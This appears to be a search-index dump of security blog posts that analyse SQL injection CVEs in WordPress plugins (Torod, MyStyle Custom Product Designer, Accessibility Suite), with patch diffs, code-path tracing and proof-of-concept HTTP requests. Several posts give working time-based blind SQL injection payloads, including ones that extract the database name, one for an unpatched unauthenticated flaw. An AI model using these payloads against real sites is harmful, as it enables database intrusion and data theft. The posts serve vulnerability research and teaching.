Always validate and sanitize user input. Use $wpdb-\u003eprepare() for database operations in WordPress to prevent SQL Injection. Keep plugins updated and perform regular security audits to avoid being an attack target. ","date":"2025-09-29","objectID":"/posts/2025-09-29-cve-2025-48118/:4:0","tags":["analyst","plugin","sqli"],"title":"CVE-2025-48118 Analysis \u0026 POC","uri":"/posts/2025-09-29-cve-2025-48118/#conclusion"},{"categories":["CVE Analysis"],"collections":null,"content":"References\rSQL Injection Cheat Sheet - PortSwigger WordPress Woocommerce Partial Shipment Plugin \u003c= 3.2 vulnerable to SQL Injection ","date":"2025-09-29","objectID":"/posts/2025-09-29-cve-2025-48118/:5:0","tags":["analyst","plugin","sqli"],"title":"CVE-2025-48118 Analysis \u0026 POC","uri":"/posts/2025-09-29-cve-2025-48118/#references"},{"categories":["CVE Analysis"],"collections":null,"content":"Security Vulnerability in WordPress Torod Plugin.","date":"2025-09-28","objectID":"/posts/2025-09-28-cve-2025-30936/","tags":["analyst","plugin","sqli"],"title":"CVE-2025-30936 Analysis \u0026 POC","uri":"/posts/2025-09-28-cve-2025-30936/"},{"categories":["CVE Analysis"],"collections":null,"content":"The vulnerability occurs in the Torod plugin for WordPress. This could allow attackers to directly interact with your database, including but not limited to stealing information. CVE ID: CVE-2025-30936 Product: WordPress Torod Plugin Vulnerability Type: SQL Injection Affected Versions: \u003c= 1.9 Fixed in: \u003c= N/A CVSS severity: High (9.3) Required Privilege: Unauthenticated ","date":"2025-09-28","objectID":"/posts/2025-09-28-cve-2025-30936/:0:0","tags":["analyst","plugin","sqli"],"title":"CVE-2025-30936 Analysis \u0026 POC","uri":"/posts/2025-09-28-cve-2025-30936/#"},{"categories":["CVE Analysis"],"collections":null,"content":"Requirements\rLocal WordPress \u0026 Debugging: Local WordPress and Debugging. Torod: v1.9 ","date":"2025-09-28","objectID":"/posts/2025-09-28-cve-2025-30936/:1:0","tags":["analyst","plugin","sqli"],"title":"CVE-2025-30936 Analysis \u0026 POC","uri":"/posts/2025-09-28-cve-2025-30936/#requirements"},{"categories":["CVE Analysis"],"collections":null,"content":"Analysis\rThe core cause is that the application directly inserts data from a POST request into an SQL query without proper input validation or control mechanisms. ","date":"2025-09-28","objectID":"/posts/2025-09-28-cve-2025-30936/:2:0","tags":["analyst","plugin","sqli"],"title":"CVE-2025-30936 Analysis \u0026 POC","uri":"/posts/2025-09-28-cve-2025-30936/#analysis"},{"categories":["CVE Analysis"],"collections":null,"content":"Vulnerable Sink\rThis CVE has no patch available, so we cannot use a diff tool to compare the vulnerable and fixed versions. In WordPress, for SQLi to occur, the application must interact with the database through the global variable $wpdb. We can search for this keyword in the plugin directory to locate the sink. Locate the sink in code\r👉 The data from $_POST['country_id'] is directly inserted into the SQL query without proper validation. Using sanitize_text_field() only escapes the string, not fully sanitizing it. Therefore, the SQL Injection vulnerability can occur. Source: $_POST['country_id'] Sink: $wpdb-\u003eget_results(\"SELECT * FROM $table_name WHERE country_id = $country_id\") ","date":"2025-09-28","objectID":"/posts/2025-09-28-cve-2025-30936/:2:1","tags":["analyst","plugin","sqli"],"title":"CVE-2025-30936 Analysis \u0026 POC","uri":"/posts/2025-09-28-cve-2025-30936/#vulnerable-sink"},{"categories":["CVE Analysis"],"collections":null,"content":"How it works?\rThe vulnerability lies in the get_regions_and_cities function of the ajaxyk class within the inc/ajaxyk.php file. To determine where it’s called, we search for the keyword get_regions_and_cities within the plugin directory. Find the get_regions_and_cities function\r👉 get_regions_and_cities is registered as a callback for two action hooks via the add_action function in the ajaxyk constructor. wp_ajax_get_regions_and_cities Written in the format wp_ajax_{$action} Requires user authentication wp_ajax_nopriv_get_regions_and_cities Written in the format wp_ajax_nopriv_{$action} Does not require authentication Since this is an unauthenticated vulnerability, we only focus on the wp_ajax_nopriv_get_regions_and_cities hook. Thus, when a POST request is sent to /wp-admin/admin-ajax.php with parameters: action=wp_ajax_nopriv_get_regions_and_cities\u0026country_id=payload_here The get_regions_and_cities callback is triggered. country_id is taken directly from the request and injected into the SQL query. The query executes with the malicious payload. ","date":"2025-09-28","objectID":"/posts/2025-09-28-cve-2025-30936/:2:2","tags":["analyst","plugin","sqli"],"title":"CVE-2025-30936 Analysis \u0026 POC","uri":"/posts/2025-09-28-cve-2025-30936/#how-it-works"},{"categories":["CVE Analysis"],"collections":null,"content":"Exploit\r","date":"2025-09-28","objectID":"/posts/2025-09-28-cve-2025-30936/:3:0","tags":["analyst","plugin","sqli"],"title":"CVE-2025-30936 Analysis \u0026 POC","uri":"/posts/2025-09-28-cve-2025-30936/#exploit"},{"categories":["CVE Analysis"],"collections":null,"content":"Detecting SQLi\rSend a POST request containing the SQLi payload: POST /wp-admin/admin-ajax.php HTTP/1.1 Host: localhost ... Cookie: cookie_here action=get_regions_and_cities\u0026country_id=(SELECT 1 FROM (SELECT SLEEP(5))a) The resulting query becomes: SELECT * FROM wp_torod_regions WHERE country_id = (SELECT 1 FROM (SELECT SLEEP(5))a) Response time result\r👉 Based on the response time =\u003e the payload works. Techniques usable when the table is empty: UNION: Since it does not depend on existing data in the table, but requires knowing the number of columns. Subquery: Subquery in WHERE clause: MySQL may optimize and skip the subquery if the result can be determined early. If the table has no data, MySQL might not execute SLEEP(). Subquery in FROM clause: The subquery is treated as a temporary table. MySQL must execute it first to build the temp table before executing the main query. SQL execution order\r","date":"2025-09-28","objectID":"/posts/2025-09-28-cve-2025-30936/:3:1","tags":["analyst","plugin","sqli"],"title":"CVE-2025-30936 Analysis \u0026 POC","uri":"/posts/2025-09-28-cve-2025-30936/#detecting-sqli"},{"categories":["CVE Analysis"],"collections":null,"content":"Get the First Letter of Database Name\rThe prerequisite to dump all data is to retrieve at least one character of the database name. Once that is achieved, the rest can be enumerated. Send a request with the SQLi payload: POST /wp-admin/admin-ajax.php HTTP/1.1 Host: localhost ... Cookie: cookie_here action=get_regions_and_cities=1\u0026country_id=(SELECT 1 FROM (SELECT IF(SUBSTRING(SCHEMA(),1,1)=0x77, SLEEP(5), 1))a) Here, SUBSTRING() extracts the first character of the database name, and IF() triggers SLEEP(5) if that character is 0x77 (‘w’). We use the hex encoding 0x77 for w because country_id is taken from a POST request, which is escaped by magic quotes in WordPress and by sanitize_text_field. 👉 Based on response time =\u003e the first character is confirmed to be w. ","date":"2025-09-28","objectID":"/posts/2025-09-28-cve-2025-30936/:3:2","tags":["analyst","plugin","sqli"],"title":"CVE-2025-30936 Analysis \u0026 POC","uri":"/posts/2025-09-28-cve-2025-30936/#get-the-first-letter-of-database-name"},{"categories":["CVE Analysis"],"collections":null,"content":"Conclusion\rThe CVE-2025-30936 vulnerability in the WordPress Torod plugin (version ≤ 1.9) stems from directly inserting user input into an SQL query without proper validation, leading to a classic SQL Injection flaw. No official patch has been released for this vulnerability yet. Key takeaways: Always validate and sanitize user input properly. Always use $wpdb-\u003eprepare() when interacting with the database in WordPress to prevent SQL Injection. Keep plugins up-to-date and perform regular security assessments to avoid being targeted. ","date":"2025-09-28","objectID":"/posts/2025-09-28-cve-2025-30936/:4:0","tags":["analyst","plugin","sqli"],"title":"CVE-2025-30936 Analysis \u0026 POC","uri":"/posts/2025-09-28-cve-2025-30936/#conclusion"},{"categories":["CVE Analysis"],"collections":null,"content":"References\rSQL Injection Cheat Sheet - PortSwigger WordPress Torod Plugin \u003c= 1.9 is vulnerable to SQL Injection ","date":"2025-09-28","objectID":"/posts/2025-09-28-cve-2025-30936/:5:0","tags":["analyst","plugin","sqli"],"title":"CVE-2025-30936 Analysis \u0026 POC","uri":"/posts/2025-09-28-cve-2025-30936/#references"},{"categories":["CVE Analysis"],"collections":null,"content":"Security Vulnerability in WordPress MyStyle Custom Product Designer Plugin.","date":"2025-09-27","objectID":"/posts/2025-09-27-cve-2025-48281/","tags":["analyst","plugin","sqli"],"title":"CVE-2025-48281 Analysis \u0026 POC","uri":"/posts/2025-09-27-cve-2025-48281/"},{"categories":["CVE Analysis"],"collections":null,"content":"The vulnerability exists in the MyStyle Custom Product Designer WordPress plugin prior to version 3.21.2. This can allow an attacker to interact directly with your database, including but not limited to data exfiltration. CVE ID: CVE-2025-48281 Product: WordPress MyStyle Custom Product Designer Plugin Vulnerability Type: SQL Injection Affected Versions: \u003c= 3.21.1 CVSS severity: High (9.3) Required Privilege: Unauthenticated ","date":"2025-09-27","objectID":"/posts/2025-09-27-cve-2025-48281/:0:0","tags":["analyst","plugin","sqli"],"title":"CVE-2025-48281 Analysis \u0026 POC","uri":"/posts/2025-09-27-cve-2025-48281/#"},{"categories":["CVE Analysis"],"collections":null,"content":"Requirements\rLocal WordPress \u0026 Debugging: Local WordPress and Debugging. MyStyle Custom Product Designer: v3.21.1 (vulnerable) and v3.21.2 (patched) diff tool: meld or any tool that can compare two versions to see differences Activated WooCommerce plugin: WooCommerce must be active before installing the MyStyle plugin because some functions from WooCommerce are used. ","date":"2025-09-27","objectID":"/posts/2025-09-27-cve-2025-48281/:1:0","tags":["analyst","plugin","sqli"],"title":"CVE-2025-48281 Analysis \u0026 POC","uri":"/posts/2025-09-27-cve-2025-48281/#requirements"},{"categories":["CVE Analysis"],"collections":null,"content":"Analysis\rThe root cause is that the application directly injects data from a GET request into an SQL query without proper validation/control. ","date":"2025-09-27","objectID":"/posts/2025-09-27-cve-2025-48281/:2:0","tags":["analyst","plugin","sqli"],"title":"CVE-2025-48281 Analysis \u0026 POC","uri":"/posts/2025-09-27-cve-2025-48281/#analysis"},{"categories":["CVE Analysis"],"collections":null,"content":"Patch Diff\rUse any diff tool to compare the vulnerable and patched versions. A clear difference exists in the file includes/entities/class-mystyle-designmanager.php public static function get_designs( $per_page = 250, $page_number = 1, WP_User $user = null ) { global $wpdb; // Add security WHERE clause. $where = self::get_security_where_clause( 'WHERE', $user ); if ( ! empty( $_GET['orderby'] ) ) { $order = ' ORDER BY ' . sanitize_text_field( wp_unslash( $_GET['orderby'] ) ); $order .= ! empty( $_GET['order'] ) ? ' ' . sanitize_text_field( wp_unslash( $_GET['order'] ) ) : ' ASC'; } else { $order = ' ORDER BY ms_design_id DESC'; } $results = $wpdb-\u003eget_results( $wpdb-\u003eprepare( 'SELECT * ' . \"FROM {$wpdb-\u003eprefix}mystyle_designs \" . $where . $order . ' LIMIT %d OFFSET %d', array( $per_page, ( $page_number - 1 ) * $per_page, ) ), 'OBJECT' ); // other logic } Data from $_GET['orderby'] is injected directly into the SQL query without proper validation. Using only sanitize_text_field() and wp_unslash() only removes or escapes characters and does not guarantee safety. Therefore, SQLi is possible. public static function get_designs( $per_page = 250, $page_number = 1, WP_User $user = null ) { global $wpdb; // Add security WHERE clause. $where = self::get_security_where_clause( 'WHERE', $user ); if ( ! empty( $_GET['orderby'] ) ) { $orderby = sanitize_text_field( wp_unslash( $_GET['orderby'] ) ); $order = ! empty( $_GET['order'] ) ? sanitize_text_field( wp_unslash( $_GET['order'] ) ) : 'ASC'; // Validate order direction to prevent SQL injection. $allowed_orderby = array( 'ms_design_id', 'ms_title', 'ms_access', 'ms_email', 'ms_date_created', 'ms_date_modified', ); $orderby = in_array( strtolower( $orderby ), $allowed_orderby, true ) ? $orderby : 'ms_design_id'; $order = in_array( strtoupper( $order ), array( 'ASC', 'DESC' ), true ) ? $order : 'ASC'; $order = ' ORDER BY ' . $orderby . ' ' . $order; } else { $order = ' ORDER BY ms_design_id DESC'; } $results = $wpdb-\u003eget_results( $wpdb-\u003eprepare( 'SELECT * ' . \"FROM {$wpdb-\u003eprefix}mystyle_designs \" . $where . $order . ' LIMIT %d OFFSET %d', array( $per_page, ( $page_number - 1 ) * $per_page, ) ), 'OBJECT' ); // other logic } The patch implements a whitelist ($allowed_orderby) that explicitly defines allowable columns for ordering. If the orderby value is not in the allowed list, it is replaced with the default 'ms_design_id' — preventing injection of malicious payloads. Patch diff\r","date":"2025-09-27","objectID":"/posts/2025-09-27-cve-2025-48281/:2:1","tags":["analyst","plugin","sqli"],"title":"CVE-2025-48281 Analysis \u0026 POC","uri":"/posts/2025-09-27-cve-2025-48281/#patch-diff"},{"categories":["CVE Analysis"],"collections":null,"content":"How it works\rThe vulnerability is in the get_designs function of the MyStyle_DesignManager class (file includes/entities/class-mystyle-designmanager.php). To find where it is called, search for get_designs within the plugin folder. 👉 get_designs is called from get_items, init_index_request and some test functions (not relevant). Search get_designs usage\rBecause this is an unauthenticated vulnerability, we must identify which function can be invoked without authentication. get_items() Function\rget_items is in the MyStyle_Wp_Rest_Api_Design_Controller class (file includes/wprestapi/class-mystyle-wp-rest-api-design-controller.php). Search get_items\rThe code before calling get_designs doesn’t handle authentication, so we must check the permission callback used by the REST route. get_items is registered as the callback for a REST API route using register_rest_route() in WordPress. public function register_routes() { $version = '2'; $vendor = 'wc-mystyle'; $namespace = $vendor . '/v' . $version; $base = 'designs'; register_rest_route( $namespace, '/' . $base, array( array( 'methods' =\u003e WP_REST_Server::READABLE, // GET 'callback' =\u003e array( $this, 'get_items' ), 'permission_callback' =\u003e array( $this, 'get_items_permissions_check' ), 'args' =\u003e array(), ) ) ) // other logic } However, before the callback is invoked, the get_items_permissions_check function runs — we need to know whether an anonymous user can call this API. Search for get_items_permissions_check. Search get_items_permissions_check\r👉 get_items_permissions_check calls wc_rest_check_manager_permissions to verify permissions with $object = 'settings'. Because wc_rest_check_manager_permissions is defined in the WooCommerce plugin (not in this plugin), we need to inspect its behavior. Search wc_rest_check_manager_permissions\rwc_rest_check_manager_permissions is defined in the WooCommerce plugin. The settings mapping leads to manage_woocommerce. It calls current_user_can( 'manage_woocommerce' ) to check user capability =\u003e only admin (or users with manage_woocommerce capability). 👉 Therefore we cannot exploit via get_items =\u003e we should try to exploit via init_index_request. init_index_request() Function\rinit_index_request is in the MyStyle_Design_Profile_Page class (file includes/pages/class-mystyle-design-profile-page.php). Search init_index_request\rThe code prior to calling get_designs doesn’t involve authentication, so we move on. init_index_request is invoked by the init method in the same class. public function init() { // Check if the current page is /designs if ( ! self::is_current_post() ) { return; } // other logic $design_id = self::get_design_id_from_url(); // Only runs when the following POST variables are present =\u003e not relevant if( isset( $_POST['delete_design_nonce'] ) \u0026\u0026 wp_verify_nonce( sanitize_key( $_POST['delete_design_nonce'] ), 'mystyle_delete_design_nonce' ) ) { $design = MyStyle_DesignManager::get( $design_id, $user, $session ) ; if ( $design ) { // Check if the user is the owner of the design or an admin. if ( current_user_can( 'administrator' ) || MyStyle_DesignManager::is_user_design_owner( $this-\u003euser-\u003eID, $design_id ) ) { // restrict the design access to 2 (deleted). $design-\u003eset_access( 2 ); MyStyle_DesignManager::persist( $design ); $this-\u003edelete_design_success_message = 'Design has been successfully deleted.'; } } } if ( false === $design_id || preg_match( '/page/', $design_id ) ) { $design_profile_page-\u003einit_index_request(); } else { $design_profile_page-\u003einit_design_request( $design_id ); } } For init_index_request to be called, the if condition must be true. We need to know what $design_id is — it’s determined by get_design_id_from_url which is called via self::get_design_id_from_url. public static function get_design_id_from_url() { // Try the query vars ( ex: \u0026design_id=10 ). $design_id = get_query_var( 'design_id' ); if ( preg_match( '/page/', $design_id ) ) { $design_id = false; } elseif ( empty( $design_id ) ) { // ---------- try at /desig","date":"2025-09-27","objectID":"/posts/2025-09-27-cve-2025-48281/:2:2","tags":["analyst","plugin","sqli"],"title":"CVE-2025-48281 Analysis \u0026 POC","uri":"/posts/2025-09-27-cve-2025-48281/#how-it-works"},{"categories":["CVE Analysis"],"collections":null,"content":"How it works\rThe vulnerability is in the get_designs function of the MyStyle_DesignManager class (file includes/entities/class-mystyle-designmanager.php). To find where it is called, search for get_designs within the plugin folder. 👉 get_designs is called from get_items, init_index_request and some test functions (not relevant). Search get_designs usage\rBecause this is an unauthenticated vulnerability, we must identify which function can be invoked without authentication. get_items() Function\rget_items is in the MyStyle_Wp_Rest_Api_Design_Controller class (file includes/wprestapi/class-mystyle-wp-rest-api-design-controller.php). Search get_items\rThe code before calling get_designs doesn’t handle authentication, so we must check the permission callback used by the REST route. get_items is registered as the callback for a REST API route using register_rest_route() in WordPress. public function register_routes() { $version = '2'; $vendor = 'wc-mystyle'; $namespace = $vendor . '/v' . $version; $base = 'designs'; register_rest_route( $namespace, '/' . $base, array( array( 'methods' =\u003e WP_REST_Server::READABLE, // GET 'callback' =\u003e array( $this, 'get_items' ), 'permission_callback' =\u003e array( $this, 'get_items_permissions_check' ), 'args' =\u003e array(), ) ) ) // other logic } However, before the callback is invoked, the get_items_permissions_check function runs — we need to know whether an anonymous user can call this API. Search for get_items_permissions_check. Search get_items_permissions_check\r👉 get_items_permissions_check calls wc_rest_check_manager_permissions to verify permissions with $object = 'settings'. Because wc_rest_check_manager_permissions is defined in the WooCommerce plugin (not in this plugin), we need to inspect its behavior. Search wc_rest_check_manager_permissions\rwc_rest_check_manager_permissions is defined in the WooCommerce plugin. The settings mapping leads to manage_woocommerce. It calls current_user_can( 'manage_woocommerce' ) to check user capability =\u003e only admin (or users with manage_woocommerce capability). 👉 Therefore we cannot exploit via get_items =\u003e we should try to exploit via init_index_request. init_index_request() Function\rinit_index_request is in the MyStyle_Design_Profile_Page class (file includes/pages/class-mystyle-design-profile-page.php). Search init_index_request\rThe code prior to calling get_designs doesn’t involve authentication, so we move on. init_index_request is invoked by the init method in the same class. public function init() { // Check if the current page is /designs if ( ! self::is_current_post() ) { return; } // other logic $design_id = self::get_design_id_from_url(); // Only runs when the following POST variables are present =\u003e not relevant if( isset( $_POST['delete_design_nonce'] ) \u0026\u0026 wp_verify_nonce( sanitize_key( $_POST['delete_design_nonce'] ), 'mystyle_delete_design_nonce' ) ) { $design = MyStyle_DesignManager::get( $design_id, $user, $session ) ; if ( $design ) { // Check if the user is the owner of the design or an admin. if ( current_user_can( 'administrator' ) || MyStyle_DesignManager::is_user_design_owner( $this-\u003euser-\u003eID, $design_id ) ) { // restrict the design access to 2 (deleted). $design-\u003eset_access( 2 ); MyStyle_DesignManager::persist( $design ); $this-\u003edelete_design_success_message = 'Design has been successfully deleted.'; } } } if ( false === $design_id || preg_match( '/page/', $design_id ) ) { $design_profile_page-\u003einit_index_request(); } else { $design_profile_page-\u003einit_design_request( $design_id ); } } For init_index_request to be called, the if condition must be true. We need to know what $design_id is — it’s determined by get_design_id_from_url which is called via self::get_design_id_from_url. public static function get_design_id_from_url() { // Try the query vars ( ex: \u0026design_id=10 ). $design_id = get_query_var( 'design_id' ); if ( preg_match( '/page/', $design_id ) ) { $design_id = false; } elseif ( empty( $design_id ) ) { // ---------- try at /desig","date":"2025-09-27","objectID":"/posts/2025-09-27-cve-2025-48281/:2:2","tags":["analyst","plugin","sqli"],"title":"CVE-2025-48281 Analysis \u0026 POC","uri":"/posts/2025-09-27-cve-2025-48281/#get_items-function"},{"categories":["CVE Analysis"],"collections":null,"content":"How it works\rThe vulnerability is in the get_designs function of the MyStyle_DesignManager class (file includes/entities/class-mystyle-designmanager.php). To find where it is called, search for get_designs within the plugin folder. 👉 get_designs is called from get_items, init_index_request and some test functions (not relevant). Search get_designs usage\rBecause this is an unauthenticated vulnerability, we must identify which function can be invoked without authentication. get_items() Function\rget_items is in the MyStyle_Wp_Rest_Api_Design_Controller class (file includes/wprestapi/class-mystyle-wp-rest-api-design-controller.php). Search get_items\rThe code before calling get_designs doesn’t handle authentication, so we must check the permission callback used by the REST route. get_items is registered as the callback for a REST API route using register_rest_route() in WordPress. public function register_routes() { $version = '2'; $vendor = 'wc-mystyle'; $namespace = $vendor . '/v' . $version; $base = 'designs'; register_rest_route( $namespace, '/' . $base, array( array( 'methods' =\u003e WP_REST_Server::READABLE, // GET 'callback' =\u003e array( $this, 'get_items' ), 'permission_callback' =\u003e array( $this, 'get_items_permissions_check' ), 'args' =\u003e array(), ) ) ) // other logic } However, before the callback is invoked, the get_items_permissions_check function runs — we need to know whether an anonymous user can call this API. Search for get_items_permissions_check. Search get_items_permissions_check\r👉 get_items_permissions_check calls wc_rest_check_manager_permissions to verify permissions with $object = 'settings'. Because wc_rest_check_manager_permissions is defined in the WooCommerce plugin (not in this plugin), we need to inspect its behavior. Search wc_rest_check_manager_permissions\rwc_rest_check_manager_permissions is defined in the WooCommerce plugin. The settings mapping leads to manage_woocommerce. It calls current_user_can( 'manage_woocommerce' ) to check user capability =\u003e only admin (or users with manage_woocommerce capability). 👉 Therefore we cannot exploit via get_items =\u003e we should try to exploit via init_index_request. init_index_request() Function\rinit_index_request is in the MyStyle_Design_Profile_Page class (file includes/pages/class-mystyle-design-profile-page.php). Search init_index_request\rThe code prior to calling get_designs doesn’t involve authentication, so we move on. init_index_request is invoked by the init method in the same class. public function init() { // Check if the current page is /designs if ( ! self::is_current_post() ) { return; } // other logic $design_id = self::get_design_id_from_url(); // Only runs when the following POST variables are present =\u003e not relevant if( isset( $_POST['delete_design_nonce'] ) \u0026\u0026 wp_verify_nonce( sanitize_key( $_POST['delete_design_nonce'] ), 'mystyle_delete_design_nonce' ) ) { $design = MyStyle_DesignManager::get( $design_id, $user, $session ) ; if ( $design ) { // Check if the user is the owner of the design or an admin. if ( current_user_can( 'administrator' ) || MyStyle_DesignManager::is_user_design_owner( $this-\u003euser-\u003eID, $design_id ) ) { // restrict the design access to 2 (deleted). $design-\u003eset_access( 2 ); MyStyle_DesignManager::persist( $design ); $this-\u003edelete_design_success_message = 'Design has been successfully deleted.'; } } } if ( false === $design_id || preg_match( '/page/', $design_id ) ) { $design_profile_page-\u003einit_index_request(); } else { $design_profile_page-\u003einit_design_request( $design_id ); } } For init_index_request to be called, the if condition must be true. We need to know what $design_id is — it’s determined by get_design_id_from_url which is called via self::get_design_id_from_url. public static function get_design_id_from_url() { // Try the query vars ( ex: \u0026design_id=10 ). $design_id = get_query_var( 'design_id' ); if ( preg_match( '/page/', $design_id ) ) { $design_id = false; } elseif ( empty( $design_id ) ) { // ---------- try at /desig","date":"2025-09-27","objectID":"/posts/2025-09-27-cve-2025-48281/:2:2","tags":["analyst","plugin","sqli"],"title":"CVE-2025-48281 Analysis \u0026 POC","uri":"/posts/2025-09-27-cve-2025-48281/#init_index_request-function"},{"categories":["CVE Analysis"],"collections":null,"content":"Exploit\r","date":"2025-09-27","objectID":"/posts/2025-09-27-cve-2025-48281/:3:0","tags":["analyst","plugin","sqli"],"title":"CVE-2025-48281 Analysis \u0026 POC","uri":"/posts/2025-09-27-cve-2025-48281/#exploit"},{"categories":["CVE Analysis"],"collections":null,"content":"Detect SQLi\rSend a GET request containing an SQLi payload. GET /designs/?orderby=(SELECT+SLEEP(5)) HTTP/1.1 Host: localhost ... Cookie: cookie_here The resulting SQL becomes: SELECT * FROM wp_mystyle_designs WHERE ms_access = 0 ORDER BY (SELECT SLEEP(5)) ASC LIMIT 25 OFFSET 0 Time-based SQLi Response\r👉 Based on the response time =\u003e the payload is effective. In this case, do not append a comment after SLEEP. Because the developer has an Enter/newline that moves OFFSET to the next line; if you comment it out, the SQL parser may return an error. Debug SQL Error\rThe chain will be split into two queries on different lines causing an error: SELECT * FROM wp_mystyle_designs WHERE ms_access = 0 ORDER BY (SELECT SLEEP(5)) -- ASC LIMIT 25 OFFSET 0 ","date":"2025-09-27","objectID":"/posts/2025-09-27-cve-2025-48281/:3:1","tags":["analyst","plugin","sqli"],"title":"CVE-2025-48281 Analysis \u0026 POC","uri":"/posts/2025-09-27-cve-2025-48281/#detect-sqli"},{"categories":["CVE Analysis"],"collections":null,"content":"Get First Letter of Database Name\rA prerequisite for dumping data is being able to extract a single character of the database name — if you can get one character, you can typically dump the rest. Send a request with an SQLi payload: GET /designs/?orderby=IF(SUBSTRING(SCHEMA(),1,1)=0x77,SLEEP(5),1) HTTP/1.1 Host: localhost ... Cookie: cookie_here This uses SUBSTRING() to get the first character of the database name, and IF() returns SLEEP(5) if that character equals 0x77 (‘w’). Hex encoding w as 0x77 is used because orderby comes from a GET parameter that may be escaped by WordPress magic quotes. 👉 Based on the response time =\u003e the first character is w. ","date":"2025-09-27","objectID":"/posts/2025-09-27-cve-2025-48281/:3:2","tags":["analyst","plugin","sqli"],"title":"CVE-2025-48281 Analysis \u0026 POC","uri":"/posts/2025-09-27-cve-2025-48281/#get-first-letter-of-database-name"},{"categories":["CVE Analysis"],"collections":null,"content":"Conclusion\rThe CVE-2025-48281 vulnerability in the WordPress MyStyle Custom Product Designer plugin prior to version 3.21.2 stems from directly inserting user-controlled input into SQL without sufficient validation, leading to SQL Injection. The official patch implements a whitelist which ensures the input is validated and safer. Key takeaways: Strictly validate user input. Always use $wpdb-\u003eprepare() when working with the database in WordPress to avoid SQL Injection. Regularly update plugins and perform security checks to avoid becoming a target. ","date":"2025-09-27","objectID":"/posts/2025-09-27-cve-2025-48281/:4:0","tags":["analyst","plugin","sqli"],"title":"CVE-2025-48281 Analysis \u0026 POC","uri":"/posts/2025-09-27-cve-2025-48281/#conclusion"},{"categories":["CVE Analysis"],"collections":null,"content":"References\rSQL Injection cheat sheet - PortSwigger WordPress MyStyle Custom Product Designer Plugin \u003c= 3.21.1 is vulnerable to SQL Injection ","date":"2025-09-27","objectID":"/posts/2025-09-27-cve-2025-48281/:5:0","tags":["analyst","plugin","sqli"],"title":"CVE-2025-48281 Analysis \u0026 POC","uri":"/posts/2025-09-27-cve-2025-48281/#references"},{"categories":["CVE Analysis"],"collections":null,"content":"Security Vulnerability in WordPress Accessibility Suite Plugin.","date":"2025-09-26","objectID":"/posts/2025-09-26-cve-2025-32650/","tags":["analyst","plugin","sqli"],"title":"CVE-2025-32650 Analysis \u0026 POC","uri":"/posts/2025-09-26-cve-2025-32650/"},{"categories":["CVE Analysis"],"collections":null,"content":"The vulnerability occurs in the Accessibility Suite plugin for WordPress before version 4.19. This allows an attacker to directly interact with the database, potentially stealing sensitive information. CVE ID: CVE-2025-32650 Product: WordPress Accessibility Suite Plugin Vulnerability Type: SQL Injection Affected Versions: \u003c= 4.18 CVSS Severity: High (8.5) Required Privilege: Subscriber ","date":"2025-09-26","objectID":"/posts/2025-09-26-cve-2025-32650/:0:0","tags":["analyst","plugin","sqli"],"title":"CVE-2025-32650 Analysis \u0026 POC","uri":"/posts/2025-09-26-cve-2025-32650/#"},{"categories":["CVE Analysis"],"collections":null,"content":"Requirements\rLocal WordPress \u0026 Debugging: Local WordPress and Debugging. Accessibility Suite: v4.18 (vulnerable) and v4.19 (patched) Diff tool: meld or any other comparison tool to spot version differences ","date":"2025-09-26","objectID":"/posts/2025-09-26-cve-2025-32650/:1:0","tags":["analyst","plugin","sqli"],"title":"CVE-2025-32650 Analysis \u0026 POC","uri":"/posts/2025-09-26-cve-2025-32650/#requirements"},{"categories":["CVE Analysis"],"collections":null,"content":"Analysis\rThe plugin failed to properly typecast user input. Although it used prepare() to prevent SQLi, the implementation was incorrect, leaving the vulnerability exploitable. ","date":"2025-09-26","objectID":"/posts/2025-09-26-cve-2025-32650/:2:0","tags":["analyst","plugin","sqli"],"title":"CVE-2025-32650 Analysis \u0026 POC","uri":"/posts/2025-09-26-cve-2025-32650/#analysis"},{"categories":["CVE Analysis"],"collections":null,"content":"Patch Diff\rUse any diff tool to compare the vulnerable and patched versions. A key difference appears in includes/classes/Helper.php. static function save_false_positive($scan_id, $issue_id){ // other logic if(! is_admin()) { return ''; } // other logic $list = json_decode( $wpdb-\u003eget_results($wpdb-\u003eprepare(\"SELECT list FROM $table_name WHERE scan_id = $scan_id\"))[0]-\u003elist // phpcs:ignore ); } The patched version passes $scan_id as a parameter to the query instead of directly concatenating it. static function save_false_positive($scan_id, $issue_id){ // other logic if(! is_admin()) { return ''; } // other logic $scan_id = absint($scan_id); // Ensure scan_id is a positive integer if (!$scan_id) { return [\"status\" =\u003e \"failed\", \"msg\" =\u003e \"Invalid scan ID\"]; } // Get list using properly prepared query $query = $wpdb-\u003eprepare( \"SELECT list FROM %i WHERE scan_id = %d\", $table_name, $scan_id ); $result = $wpdb-\u003eget_results($query); } Patch Diff ","date":"2025-09-26","objectID":"/posts/2025-09-26-cve-2025-32650/:2:1","tags":["analyst","plugin","sqli"],"title":"CVE-2025-32650 Analysis \u0026 POC","uri":"/posts/2025-09-26-cve-2025-32650/#patch-diff"},{"categories":["CVE Analysis"],"collections":null,"content":"How it works\rThe vulnerability resides in the static function save_false_positive of class Helper in includes/classes/Helper.php. To locate where it’s called, search for save_false_positive in the plugin directory. Search Function Call 👉 The save_false_positive function is called as a callback by the action hook wp_ajax_ONLINE_ADAv4/save_false_positive. When a POST request is sent to /wp-admin/admin-ajax.php with action=ONLINE_ADAv4/save_false_positive, the callback is executed. It requires two POST parameters: issue_id and scan_id. If they’re missing, the app returns: The function checks if the user has admin privileges; if not, it returns an empty string. if(! is_admin()) { return ''; } Then, the parameters are directly concatenated into the vulnerable SQL query. ","date":"2025-09-26","objectID":"/posts/2025-09-26-cve-2025-32650/:2:2","tags":["analyst","plugin","sqli"],"title":"CVE-2025-32650 Analysis \u0026 POC","uri":"/posts/2025-09-26-cve-2025-32650/#how-it-works"},{"categories":["CVE Analysis"],"collections":null,"content":"Exploit\r","date":"2025-09-26","objectID":"/posts/2025-09-26-cve-2025-32650/:3:0","tags":["analyst","plugin","sqli"],"title":"CVE-2025-32650 Analysis \u0026 POC","uri":"/posts/2025-09-26-cve-2025-32650/#exploit"},{"categories":["CVE Analysis"],"collections":null,"content":"Detecting the SQLi\rSend a POST request containing an SQLi payload. Since it only requires an authenticated user with access to /wp-admin/, we can use a subscriber role — the lowest privilege in WordPress. Higher roles inherit lower privileges, so this confirms the CVE’s description. POST /wp-admin/admin-ajax.php HTTP/1.1 Host: localhost Content-Type: application/x-www-form-urlencoded; charset=UTF-8 ... Cookie: cookie_here action=ONLINE_ADAv4/save_false_positive\u0026issue_id=1\u0026scan_id=1 UNION SELECT SLEEP(5) The resulting SQL query becomes: SELECT list FROM wp_oada_false_positives WHERE scan_id = 1 UNION SELECT SLEEP(5) Time-based SQLi Response 👉 The delayed response confirms 